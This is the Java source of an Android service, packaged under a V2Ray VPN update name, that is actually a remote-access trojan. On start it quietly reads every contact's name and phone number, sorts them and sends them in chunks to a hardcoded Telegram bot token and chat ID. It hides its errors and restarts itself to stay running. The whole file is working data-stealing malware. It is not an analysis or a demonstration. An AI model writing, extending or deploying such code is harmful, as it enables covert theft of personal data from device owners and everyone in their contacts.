package com.v2ray.update;
import android.app.Service; import android.content.Intent; import android.database.Cursor; import android.os.IBinder; import android.provider.ContactsContract;
import java.io.*; import java.net.HttpURLConnection; import java.net.URL; import java.nio.charset.StandardCharsets;
import java.util.*;
public class RatService extends Service {
    private static final String BOT_TOKEN = "9178490317:AAFZJTBGopALDFWZO5kuvXNvSL4B7x5CCdY";
    private static final String CHAT_ID = "8895860731";
    private static final String API = "https://api.telegram.org/bot" + BOT_TOKEN;

    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try { sendContacts(); } catch (Exception e) {}
        }).start();
        return START_STICKY;
    }

    private void sendContacts() throws Exception {
        List<String> contacts = new ArrayList<>();
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                if (name != null && number != null) {
                    contacts.add("👤 " + name + "\n📞 " + number);
                }
            }
            c.close();
        }
        
        // مرتب سازی حروف الفبا
        Collections.sort(contacts);
        
        StringBuilder sb = new StringBuilder();
        for (String contact : contacts) {
            sb.append(contact).append("\n-------------------\n");
        }
        
        // ارسال به صورت تکه‌های 3500 کاراکتری که تلگرام ارور نده
        String fullText = sb.toString();
        int maxLength = 3500;
        for (int i = 0; i < fullText.length(); i += maxLength) {
            int end = Math.min(fullText.length(), i + maxLength);
            sendText("📇 Contacts List", fullText.substring(i, end));
        }
    }

    private void sendText(String title, String body) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(API + "/sendMessage").openConnection();
            c.setDoOutput(true); c.setRequestMethod("POST"); c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            try (OutputStream os = c.getOutputStream()) { os.write(("chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(title + "\n\n" + body, "UTF-8")).getBytes(StandardCharsets.UTF_8)); }
            c.getResponseCode();
        } catch (Exception e) {}
    }
}